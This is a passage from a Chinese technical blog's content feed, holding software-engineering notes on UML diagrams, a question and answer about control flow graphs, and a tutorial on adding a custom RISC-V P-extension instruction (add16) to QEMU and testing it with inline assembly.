<code>&lt;&lt;extend&gt;&gt;</code></h4><p>特殊情况，需要有条件</p><p><strong>关键词</strong>：错误，特殊情况</p><hr><h3 id="活动图"><a href="#活动图" class="headerlink" title="活动图"></a>活动图</h3><p>跨用例</p><h4 id="图示"><a href="#图示" class="headerlink" title="图示"></a>图示</h4><ul><li><p><strong>开始点</strong> ：实心圆点 ， <strong>结束点</strong> ：实心加一圈</p></li><li><p><strong>动作</strong>：圆角矩形</p></li><li><p><strong>条件</strong> ： 菱形 - 可省略</p></li><li><p><strong>分支</strong>，<strong>汇聚</strong>： 粗横线， {and}，{or}</p></li><li><p><strong>对象</strong>： 直角矩形</p></li><li><p><strong>集合</strong> ： 多个动作 （三叉戟）</p></li></ul><p>如果动作具有多个汇聚的箭头，需要等待所有分支都完成</p><h4 id="泳道"><a href="#泳道" class="headerlink" title="泳道"></a>泳道</h4><p>按角色划分</p><h4 id="基本事件流和备选"><a href="#基本事件流和备选" class="headerlink" title="基本事件流和备选"></a>基本事件流和备选</h4><p>利用中括号<code>[]</code> 围绕子活动或者进入备选事件流的条件，可以另用活动图描述</p><hr><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><h4 id="基本符号"><a href="#基本符号" class="headerlink" title="基本符号"></a>基本符号</h4><p>实体，处理，存储，流</p><h4 id="画法"><a href="#画法" class="headerlink" title="画法"></a>画法</h4><p>看课件</p><hr><h3 id="包图"><a href="#包图" class="headerlink" title="包图"></a>包图</h3><p>大包 嵌套 小包，小包 嵌套 类</p><p>$$ \oplus $$ : 嵌套关系</p><p>虚线：层间的使用(依赖)关系</p><p>实线：包间的使用(依赖)关系</p><p>空心三角： 继承</p><p>避免循环依赖</p><hr><h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><h4 id="领域模型-1"><a href="#领域模型-1" class="headerlink" title="领域模型"></a>领域模型</h4><h5 id="实体类-lt-lt-entity-gt-gt-1"><a href="#实体类-lt-lt-entity-gt-gt-1" class="headerlink" title="实体类 &lt;&lt;entity&gt;&gt;"></a>实体类 <code>&lt;&lt;entity&gt;&gt;</code></h5><ul><li>类名 ： 构造性</li><li>变量：<ul><li>可见性 (private , public ..) - (-,+,_,~)</li><li>依赖（计算）属性，(/)</li><li>名字 ： </li><li>类型 ： UML定义的，int String…</li><li>下划线：表示静态</li></ul></li><li>方法：<ul><li>同上</li><li>参数三种类型 ： in ， out ,inout</li></ul></li></ul><p>没有方法</p><h4 id="关联类"><a href="#关联类" class="headerlink" title="关联类"></a>关联类</h4><p>描述两个对象之间的联系</p><hr><h3 id="顺序图"><a href="#顺序图" class="headerlink" title="顺序图"></a>顺序图</h3><p>表示一个用例，同步调用的方式（阻塞）</p><ul><li>控制焦点 ： 长方形</li><li>生命线: 竖虚线</li><li>同步消息：实心三角箭头 （左右都可以）</li><li>返回消息： 虚线左箭头</li><li>异步消息： 创建对象 ， 虚线右箭头</li></ul><p>不会，找我，给图</p><p><strong>结构</strong>：</p><ul><li>方括号 condition</li><li>可选 ： opt - 有条件执行的动作，不满足条件就不执行</li><li>多分支 alt - 不同的条件执行不同的同坐</li><li>循环 loop(start,end,condition)</li></ul><hr><h3 id="通信图"><a href="#通信图" class="headerlink" title="通信图"></a>通信图</h3><p>可嵌套，或用编号.编号表示嵌套级别</p><p>其他与顺序图类似</p><hr><h3 id="状态图"><a href="#状态图" class="headerlink" title="状态图"></a>状态图</h3><p>唯一的开始状态，可以有多个结束状态，针对确定性行为</p><p>转台框中的三个状态 ： Entry - Do - Exit</p><h4 id="状态转换-过渡"><a href="#状态转换-过渡" class="headerlink" title="状态转换 - 过渡"></a>状态转换 - 过渡</h4><p>事件+[条件]+动作</p><p>在<strong>事件</strong>被触发并且满足某个特定<strong>条件</strong>的情况下才会进行</p><p><strong>动作</strong>：entry 执行前，未进入状态时做的动作</p><p>层次化组织 ： 框起来</p><p>分解 ： 分解为互不依赖的子状态 - 子状态离开</p><p>并行： 有两个输入，则都完成才会被触发</p><h2 id="体系结构风格"><a href="#体系结构风格" class="headerlink" title="体系结构风格"></a>体系结构风格</h2><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>从低到高排序</p><p>内聚程度：内部各个元素彼此结合的紧密程度 - 越高，模块独立性越强</p><ul><li>偶然内聚、逻辑内聚、时间内聚、通信内聚、顺序内聚及<strong>功能</strong>内聚。</li></ul><p>耦合程度：模块之间互相连接的紧密程度 - 越低，模块独立性越强</p><ul><li>非直接 &lt; <strong>数据</strong>＜标记＜控制&lt; 外部＜公共＜内容</li></ul><h3 id="4-1-视图模型"><a href="#4-1-视图模型" class="headerlink" title="4+1 视图模型"></a>4+1 视图模型</h3><p>用例在中间，四周是逻辑视图（功能需求），开发试图（软件模块），进程视图（并发），物理视图（硬件） </p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Question</title>
      <link href="/2021/03/07/Question/"/>
      <url>/2021/03/07/Question/</url>
      
        <content type="html"><![CDATA[<p>本文主要是用于询问软件工程问题</p><a id="more"></a><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h3 id="老师我想问一下课后题的-11-2"><a href="#老师我想问一下课后题的-11-2" class="headerlink" title="老师我想问一下课后题的 11.2"></a>老师我想问一下课后题的 11.2</h3><img src="/2021/03/07/Question/CFG-3.jpg" class="" title="11.2"><h3 id="老师您上课给的答案如下"><a href="#老师您上课给的答案如下" class="headerlink" title="老师您上课给的答案如下"></a>老师您上课给的答案如下</h3><img src="/2021/03/07/Question/CFG-1.jpg" class="" title="Answer"><p>我对于 4 结点与 9 结点有点问题，<br>4 结点我认为应该是两个结点，9结点在代码上没有实际的代码行对应</p><h3 id="我做的结果详细的是下图"><a href="#我做的结果详细的是下图" class="headerlink" title="我做的结果详细的是下图"></a>我做的结果详细的是下图</h3><img src="/2021/03/07/Question/CFG.png" class="" title="MyAnswer"><h1 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h1><p>控制流图应该尽量简洁，便于计算环形复杂度，顺序结构能合并的应该尽量合并，同时需要注意的是这样的合并并不会改变环形复杂度</p><p>4 结点是 合并后的结果 -     结点数 - 1 ，边 - 1 不影响环形复杂度</p><p>9 结点是 为了画图更清晰 - 结点数 + 1 ，边 + 1 不影响环形复杂度</p><p>更改的图例如下</p><img src="/2021/03/07/Question/CFG-0.png" class="" title="MyAnswer">]]></content>
      
      
      
        <tags>
            
            <tag> Question </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在QEMU中定制RISCV指令并测试</title>
      <link href="/2021/02/13/%E5%9C%A8QEMU%E4%B8%AD%E5%AE%9A%E5%88%B6RISCV%E6%8C%87%E4%BB%A4%E5%B9%B6%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/02/13/%E5%9C%A8QEMU%E4%B8%AD%E5%AE%9A%E5%88%B6RISCV%E6%8C%87%E4%BB%A4%E5%B9%B6%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>本文主要是介绍</p><ol><li>通过QEMU中提供的Decode Tree 的方法定义指令编码</li><li>定义指令的转义和指令的基础逻辑</li><li>利用二进制的方式定义测试程序并测试</li><li>使用 P扩展(Packed SIMD) 作为示例</li></ol><a id="more"></a><h3 id="QEMU-下载"><a href="#QEMU-下载" class="headerlink" title="QEMU 下载"></a>QEMU 下载</h3><p>为了更改QEMU的源码，我们需要正确下载源代码并自行进行编译，QEMU提供了两种方式方便我们下载。</p><p>通过 <code>git</code> 的方式下载 QEMU 的<strong>最新</strong>源码 - 该方式可能需要一个稳定的 “科学的” 网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://gitlab.com/qemu-project/qemu.git<span class="token builtin class-name">cd</span> qemu<span class="token function">git</span> submodule init<span class="token function">git</span> submodule update --recursive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>同样的，我们可以直接选择下载官网打包好的最新稳定版的QEMU源码，这能让你更稳定，快速的得到代码，但可能不是 git 同步的最新版本 - <a href="https://download.qemu.org/qemu-5.2.0.tar.xz">QEMU-5.2.0</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://download.qemu.org/qemu-5.2.0.tar.xz<span class="token function">tar</span> xvJf qemu-5.2.0.tar.xz<span class="token builtin class-name">cd</span> qemu-5.2.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过以上方式下载过后，我们可以开始进行指令的添加了</p><h3 id="指令编码-Decode-Tree"><a href="#指令编码-Decode-Tree" class="headerlink" title="指令编码 - Decode Tree"></a>指令编码 - Decode Tree</h3><p>为了方便开发者和编译检查，QEMU 中的指令的二进制指令编码都是以<code>Decode Tree</code> 方式进行定义的，QEMU的内部程序在编译时会将其自动解析为 c 语言。</p><p>特别地，像 RISC-V 这种拥有固定指令格式的 ISA 特别契合 Decode Tree。因为各个指令段都在固定的位置。各个段的重复性要高很多，足以节省很多代码空间</p><p>下面我们已一种最常用的三参数指令的P扩展<code>add16</code>作为例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#！target/riscv/insn*.decode</span><span class="token comment">#        31:25   24:20 19:15 14:12 11:7  6:0</span>add16    0100000 <span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token punctuation">..</span><span class="token punctuation">..</span>. 000   <span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">1110111</span> @r<span class="token comment">#        funct7  Rs2   Rs1  funct3  Rd   opcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"># 其中用到的各个定义如下<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Formats <span class="token number">32</span><span class="token operator">:</span></span></span>@r       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">&amp;</span>r  <span class="token operator">%</span>rs2 <span class="token operator">%</span>rs1 <span class="token operator">%</span>rd<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Fields<span class="token operator">:</span></span></span><span class="token operator">%</span>rs2       <span class="token number">20</span><span class="token operator">:</span><span class="token number">5</span><span class="token operator">%</span>rs1       <span class="token number">15</span><span class="token operator">:</span><span class="token number">5</span><span class="token operator">%</span>rd        <span class="token number">7</span><span class="token operator">:</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个指令的定义有以下几个过程</p><ol><li>找到官方文件对于指令编码的定义，将指令名称<code>add16</code>和二进制编码<code>0100000 ..... ..... 000   ..... 1110111</code>填入</li><li>通过指令对于参数的定义，选取合适的<code>Format</code>，例如 <code>@r</code> ，就顺序包含了两个输入寄存器<code>rs1 &amp; rs2</code> 和输出寄存器<code>rd</code></li><li>如果没有，就需要自己定义</li></ol><p>有关decoder tree 的具体内容，接下来的博客可能会进行阐述，</p><p>但是有的 blogs 已经有了详细的阐述，qemu 官方也有，下面给出链接，大家可以参阅</p><p>QEMU官方： <a href="https://qemu.readthedocs.io/en/latest/devel/decodetree.html">Decode Tree的定义</a></p><p>其他博客的定义：<a href="https://0xc0de.tw/QEMU-Decodetree-%E8%AA%9E%E6%B3%95%E4%BB%8B%E7%B4%B9-Part-1/">Part-1</a>，<a href="https://0xc0de.tw/QEMU-Decodetree-%E8%AA%9E%E6%B3%95%E4%BB%8B%E7%B4%B9-Part-2/">Part-2</a></p><h3 id="指令转译-trans"><a href="#指令转译-trans" class="headerlink" title="指令转译 - trans"></a>指令转译 - trans</h3><p>QEMU在执行时，会将 <code>target instructions</code>(e.g. RISC-V instructions) 转译成 <code>TCG ops</code>，而<code>TCG ops</code>则会再转译为<code>host instructions</code>(e.g. x86 instruction)。而<code>trans_add16()</code> 实际执行了 <code>add16</code> 指令对应的 <code>TCG ops</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#！ QEMU dynamic instructions translation</span>+---------------------+      +---------+      +-------------------+<span class="token operator">|</span> Target Instructions <span class="token operator">|</span> ---<span class="token operator">></span> <span class="token operator">|</span> TCG ops <span class="token operator">|</span> ---<span class="token operator">></span> <span class="token operator">|</span> Host instructions <span class="token operator">|</span>+---------------------+      +---------+      +-------------------+     <span class="token punctuation">(</span>e.g. RISC-V<span class="token punctuation">)</span>                                  <span class="token punctuation">(</span>e.g. x86<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于 <code>TCG</code> 的说明，可以参考 <code>QEMU</code> 的 <code>documentations</code> <a href="https://github.com/qemu/qemu/blob/master/docs/devel/tcg.rst">Translator Internals</a>，<a href="https://github.com/qemu/qemu/blob/master/tcg/README">TCG Readme</a></p><p>为了方便定义和区分，新建一个文件<code>./target/riscv/insn_trans/trans_rvp.inc.c</code>来定义<code>P Extension</code>指令的<code>trans_xx()</code>函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#！ <span class="token punctuation">.</span><span class="token operator">/</span>target<span class="token operator">/</span>riscv<span class="token operator">/</span>insn_trans<span class="token operator">/</span>trans_rvb<span class="token punctuation">.</span>c<span class="token punctuation">.</span>inc<span class="token comment">/* * RISC-V translation routines for the RVP Standard Extension. */</span><span class="token keyword">static</span> bool <span class="token function">trans_add16</span><span class="token punctuation">(</span>DisasContext <span class="token operator">*</span>ctx<span class="token punctuation">,</span> arg_pcnt <span class="token operator">*</span>a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">-></span>rd <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TCGv t0 <span class="token operator">=</span> <span class="token function">tcg_temp_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TCGv t1 <span class="token operator">=</span> <span class="token function">tcg_temp_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TCGv rt <span class="token operator">=</span> <span class="token function">tcg_temp_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">gen_get_gpr</span><span class="token punctuation">(</span>t0<span class="token punctuation">,</span> a<span class="token operator">-></span>rs1<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">gen_get_gpr</span><span class="token punctuation">(</span>t1<span class="token punctuation">,</span> a<span class="token operator">-></span>rs2<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">gen_helper_add16</span><span class="token punctuation">(</span>rt<span class="token punctuation">,</span> t0<span class="token punctuation">,</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">gen_set_gpr</span><span class="token punctuation">(</span>a<span class="token operator">-></span>rd<span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">tcg_temp_free</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">tcg_temp_free</span><span class="token punctuation">(</span>t0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">tcg_temp_free</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于对<code>x0</code>(<code>zero register</code>)的写入都会被忽略，因此首先判断<code>rd</code>是否为<strong>0</strong>，若为<strong>0</strong>则不做任何事情</p><p>接着声明两个TCG variable：<code>t0和t1</code>，利用<code>gen_get_gpr()</code>将<code>rs1,rs2</code>寄存器的值存入变量</p><p>声明一个新变量 <code>rt</code>  利用 <code>gen_set_gpr()</code> 将 结果存入 <code>rd</code> 寄存器中</p><p>利用新声明的变量调用<code>gen_helper_add16()</code>函数转向<code>helper function</code>，该函数计算完成后，会将结果保存在<code>rd</code>(i.e. <code>cpu_gpr[a-&gt;rd]</code>)寄存器中。</p><p>P.S. 其实这里可以简单的直接将<code>cpu_gpr[a-&gt;rs1]</code>传入，省略TCG variable: <code>t0,t1</code> 的声明：</p><p><strong>注意 ： 该方法不推荐使用，我们在测试过程发现这样可能导致错误的产生</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span> <span class="token punctuation">.</span><span class="token operator">/</span>target<span class="token operator">/</span>riscv<span class="token operator">/</span>insn_trans<span class="token operator">/</span>trans_rvp<span class="token punctuation">.</span>c<span class="token punctuation">.</span>inc<span class="token comment">/* * RISC-V translation routines for the RVB Standard Extension. */</span><span class="token keyword">static</span> bool <span class="token function">trans_add16</span><span class="token punctuation">(</span>DisasContext <span class="token operator">*</span>ctx<span class="token punctuation">,</span> arg_pcnt <span class="token operator">*</span>a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">-></span>rd <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">gen_helper_add16</span><span class="token punctuation">(</span>cpu_gpr<span class="token punctuation">[</span>a<span class="token operator">-></span>rd<span class="token punctuation">]</span><span class="token punctuation">,</span> cpu_gpr<span class="token punctuation">[</span>a<span class="token operator">-></span>rs1<span class="token punctuation">]</span><span class="token punctuation">,</span> cpu_gpr<span class="token punctuation">[</span>a<span class="token operator">-></span>rs2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="指令的逻辑-helper-function"><a href="#指令的逻辑-helper-function" class="headerlink" title="指令的逻辑  - helper function"></a>指令的逻辑  - helper function</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">DEF_HELPER_2</span><span class="token expression"><span class="token punctuation">(</span>name<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token function">DEF_HELPER_FLAGS_2</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ret<span class="token punctuation">,</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">)</span></span></span><span class="token comment">//DEF_HELPER_FLAGS_2(name,flag,ret,t1,t2)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为了方便QEMU对于helper function的调用和定义，我们需要定义一个函数<code>DEF_HELPER_x = DEF_HELPER_FLAGS_x</code>  对QEMU声明函数的名称和参数, <strong>x</strong>代表该<strong>指令需要的参数</strong>-(自变量），不带 <code>_FLAGS</code> 的函数会利用命令自动将 <strong>FLAGS</strong>参数置为0。</p><ul><li><strong>name</strong> ：指令的名称，连接成 <code>HELPER(name) / helper_name</code> 的形式作为 <strong>helper function</strong></li><li> <strong>flag</strong>    :  函数权限位，TCG调用的权限，全局不读/写，返回值无用，无返回值。<code>tcg.h</code></li><li>  <strong>ret</strong>     :  <code>helper function</code>返回值</li><li> <strong>t1- tn</strong> ：<code>helper function</code>的参数</li></ul><p>ret 和 t1-tn 的类型可以是，</p><table><thead><tr><th>类型</th><th>意义</th></tr></thead><tbody><tr><td>tl</td><td>target_ulong - QEMU中保存寄存器值得基本单位</td></tr><tr><td>env</td><td>environment - CPUXXSTATE 保存CPU状态寄存器的值</td></tr><tr><td>i64</td><td>integer-64 - 64位整型可用于浮点数指令</td></tr></tbody></table><p><code>add16</code>的 helper function 定义如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span> <span class="token punctuation">.</span><span class="token operator">/</span>target<span class="token operator">/</span>riscv<span class="token operator">/</span>helper<span class="token punctuation">.</span>h<span class="token comment">/* Packed-SIMD Extension */</span><span class="token function">DEF_HELPER_2</span><span class="token punctuation">(</span>add16<span class="token punctuation">,</span> tl<span class="token punctuation">,</span> tl<span class="token punctuation">,</span> tl<span class="token punctuation">)</span><span class="token function">DEF_HELPER_FLAGS_3</span><span class="token punctuation">(</span>add16<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> tl<span class="token punctuation">,</span> tl<span class="token punctuation">,</span> tl<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>两种定义意义相同</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span> <span class="token punctuation">.</span><span class="token operator">/</span>target<span class="token operator">/</span>riscv<span class="token operator">/</span>bitmanip_helper<span class="token punctuation">.</span>c<span class="token comment">/* * RISC-V P Extension Helpers for QEMU. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"qemu/osdep.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"cpu.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"exec/exec-all.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"exec/helper-proto.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">u16p</span> <span class="token expression"><span class="token class-name">uint16_t</span> <span class="token operator">*</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>TARGET_RISCV32<span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token class-name">uint32_t</span> LC_16BIT <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">const</span> <span class="token class-name">uint32_t</span> LC_16BIT <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">// target_ulong HELPER(add16)(target_ulong rs1, target_ulong rs2) </span>target_ulong <span class="token function">helper_add16</span> <span class="token punctuation">(</span>target_ulong rs1<span class="token punctuation">,</span> target_ulong rs2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    target_ulong rd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    u16p rs1_p <span class="token operator">=</span> <span class="token punctuation">(</span>u16p<span class="token punctuation">)</span><span class="token operator">&amp;</span>rs1<span class="token punctuation">;</span>    u16p rs2_p <span class="token operator">=</span> <span class="token punctuation">(</span>u16p<span class="token punctuation">)</span><span class="token operator">&amp;</span>rs2<span class="token punctuation">;</span>    u16p rd_p  <span class="token operator">=</span> <span class="token punctuation">(</span>u16p<span class="token punctuation">)</span><span class="token operator">&amp;</span>rd<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> LC_16BIT<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        rd_p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rs1_p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> rs2_p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rd<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数就是<code>add16</code>的实际逻辑函数，<code>helper function</code> 接受两个 <code>target_ulong</code> 类型的 <code>rs1&amp;rs2</code>, 并将结果返回，存储在 <code>rd</code> 寄存器</p><p><code>add16</code> 指令的内容，是将寄存器分为多个<strong>16</strong>位数并分别计算，因此我们将<code>rs1/2</code> 变为<strong>16</strong>位的数组(指针)并分别进行加法运算，得到结果然后返回。</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>为了使指令成功执行，我们还需要填写以下代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span> <span class="token punctuation">.</span><span class="token operator">/</span>target<span class="token operator">/</span>riscv<span class="token operator">/</span>meson<span class="token punctuation">.</span>buildriscv_ss<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">files</span><span class="token punctuation">(</span>  <span class="token string">'psimd_helper.c'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span> <span class="token punctuation">.</span><span class="token operator">/</span>target<span class="token operator">/</span>riscv<span class="token operator">/</span>translate<span class="token punctuation">.</span>c<span class="token comment">/* Include insn module translation function */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"insn_trans/trans_rvp.c.inc"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="指令的测试"><a href="#指令的测试" class="headerlink" title="指令的测试"></a>指令的测试</h3><p>在我们了解了指令的添加流程后，我们要对添加后的指令进行测试以确保指令的正确性。</p><p>为了成功编译，你需要事先安装<code>riscv64-unknown-elf-gcc</code>来编译测试程序，你可以通过  <a href="https://github.com/riscv/riscv-gnu-toolchain">riscv-gnu-toolchain</a> 进行编译安装</p><p>下面我将介绍一下QEMU的编译过程，鉴于我们只需要QEMU的用户态测试程序，我们执行以下命令在你保存qemu的文件夹下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> build<span class="token builtin class-name">cd</span> build<span class="token punctuation">..</span>/configure --target-list<span class="token operator">=</span>riscv64-linux-user<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>build</code> 文件夹用于保存你的编译结果，你也可以自由选择想要保存的文件夹。</p><p>接着我们创建一个 <code>p_test</code> 文件夹保存测试程序并进行测试, 因为原有的工具链并不含有新添加的指令，没办法编译成合适的二进制编码，所以我们使用内联汇编为其提供二进制编码，省去更改工具链的麻烦。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span> <span class="token punctuation">.</span><span class="token operator">/</span>build<span class="token operator">/</span>p_test<span class="token operator">/</span>add16<span class="token punctuation">.</span>c<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>noinline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">int</span> <span class="token function">mac_asm</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">asm</span> <span class="token function">__volatile__</span> <span class="token punctuation">(</span><span class="token string">".word 0x40c58577\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">asm</span> <span class="token function">__volatile__</span> <span class="token punctuation">(</span><span class="token string">"mv  %0,a0\n"</span>                <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>                <span class="token operator">:</span>                <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token 